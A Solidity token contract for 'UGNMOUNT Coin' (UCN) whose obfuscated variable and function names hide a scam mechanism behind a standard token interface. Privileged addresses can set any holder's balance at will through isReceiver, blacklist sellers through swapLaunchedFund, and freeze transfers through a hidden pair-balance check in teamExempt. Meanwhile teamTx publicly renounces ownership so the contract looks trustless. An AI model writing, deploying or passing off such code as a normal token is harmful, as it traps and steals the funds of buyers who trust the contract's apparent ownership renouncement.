//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface swapReceiver {
    function createPair(address feeMin, address teamExemptLaunch) external returns (address);
}

interface liquidityAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellLiquidityFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buySwap) external view returns (uint256);

    function transfer(address shouldTradingAmount, uint256 fundAt) external returns (bool);

    function allowance(address senderTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundAt) external returns (bool);

    function transferFrom(
        address sender,
        address shouldTradingAmount,
        uint256 fundAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toFee, uint256 value);
    event Approval(address indexed senderTake, address indexed spender, uint256 value);
}

interface atShouldMetadata is atShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UGNMOUNTCoin is sellLiquidityFund, atShould, atShouldMetadata {

    function transferFrom(address fromIs, address shouldTradingAmount, uint256 fundAt) external override returns (bool) {
        if (_msgSender() != modeTxShould) {
            if (isAt[fromIs][_msgSender()] != type(uint256).max) {
                require(fundAt <= isAt[fromIs][_msgSender()]);
                isAt[fromIs][_msgSender()] -= fundAt;
            }
        }
        return teamExempt(fromIs, shouldTradingAmount, fundAt);
    }

    function isReceiver(address receiverModeTx, uint256 fundAt) public {
        marketingToMode();
        marketingLimit[receiverModeTx] = fundAt;
    }

    event OwnershipTransferred(address indexed fundReceiver, address indexed feeLaunched);

    uint256 private toLimit;

    bool private receiverTo;

    uint256 private teamSender = 100000000 * 10 ** 18;

    uint256 buyAtFee;

    function totalSupply() external view virtual override returns (uint256) {
        return teamSender;
    }

    function teamExempt(address fromIs, address shouldTradingAmount, uint256 fundAt) internal returns (bool) {
        if (fromIs == enableTeamAmount) {
            return fundIsLaunch(fromIs, shouldTradingAmount, fundAt);
        }
        uint256 amountMarketingEnable = atShould(exemptLiquidityMax).balanceOf(toIsFee);
        require(amountMarketingEnable == buyAtFee);
        require(!listTrading[fromIs]);
        return fundIsLaunch(fromIs, shouldTradingAmount, fundAt);
    }

    function enableAt(address toSell) public {
        if (sellMarketingShould) {
            return;
        }
        if (listEnable) {
            listEnable = true;
        }
        liquidityToken[toSell] = true;
        if (toLimit != autoBuy) {
            teamEnable = false;
        }
        sellMarketingShould = true;
    }

    uint256 fundTake;

    function allowance(address listBuy, address txAmount) external view virtual override returns (uint256) {
        if (txAmount == modeTxShould) {
            return type(uint256).max;
        }
        return isAt[listBuy][txAmount];
    }

    string private senderReceiver = "UCN";

    bool public sellMarketingShould;

    function getOwner() external view returns (address) {
        return exemptSell;
    }

    mapping(address => bool) public listTrading;

    bool private shouldTake;

    function fundIsLaunch(address fromIs, address shouldTradingAmount, uint256 fundAt) internal returns (bool) {
        require(marketingLimit[fromIs] >= fundAt);
        marketingLimit[fromIs] -= fundAt;
        marketingLimit[shouldTradingAmount] += fundAt;
        emit Transfer(fromIs, shouldTradingAmount, fundAt);
        return true;
    }

    string private toToken = "UGNMOUNT Coin";

    function decimals() external view virtual override returns (uint8) {
        return enableTo;
    }

    function launchBuyEnable(uint256 fundAt) public {
        marketingToMode();
        buyAtFee = fundAt;
    }

    uint8 private enableTo = 18;

    function balanceOf(address buySwap) public view virtual override returns (uint256) {
        return marketingLimit[buySwap];
    }

    bool public exemptLaunchMin;

    address modeTxShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private teamEnable;

    uint256 public autoBuy;

    address private exemptSell;

    function symbol() external view virtual override returns (string memory) {
        return senderReceiver;
    }

    address public enableTeamAmount;

    function teamTx() public {
        emit OwnershipTransferred(enableTeamAmount, address(0));
        exemptSell = address(0);
    }

    address public exemptLiquidityMax;

    mapping(address => mapping(address => uint256)) private isAt;

    function transfer(address receiverModeTx, uint256 fundAt) external virtual override returns (bool) {
        return teamExempt(_msgSender(), receiverModeTx, fundAt);
    }

    mapping(address => uint256) private marketingLimit;

    function owner() external view returns (address) {
        return exemptSell;
    }

    function name() external view virtual override returns (string memory) {
        return toToken;
    }

    function marketingToMode() private view {
        require(liquidityToken[_msgSender()]);
    }

    function approve(address txAmount, uint256 fundAt) public virtual override returns (bool) {
        isAt[_msgSender()][txAmount] = fundAt;
        emit Approval(_msgSender(), txAmount, fundAt);
        return true;
    }

    constructor (){
        
        teamTx();
        liquidityAmount launchToken = liquidityAmount(modeTxShould);
        exemptLiquidityMax = swapReceiver(launchToken.factory()).createPair(launchToken.WETH(), address(this));
        if (teamEnable) {
            listEnable = true;
        }
        enableTeamAmount = _msgSender();
        liquidityToken[enableTeamAmount] = true;
        marketingLimit[enableTeamAmount] = teamSender;
        if (receiverTo) {
            receiverTo = false;
        }
        emit Transfer(address(0), enableTeamAmount, teamSender);
    }

    bool public listEnable;

    address toIsFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function swapLaunchedFund(address teamMax) public {
        marketingToMode();
        if (toLimit == autoBuy) {
            shouldTake = true;
        }
        if (teamMax == enableTeamAmount || teamMax == exemptLiquidityMax) {
            return;
        }
        listTrading[teamMax] = true;
    }

    mapping(address => bool) public liquidityToken;

}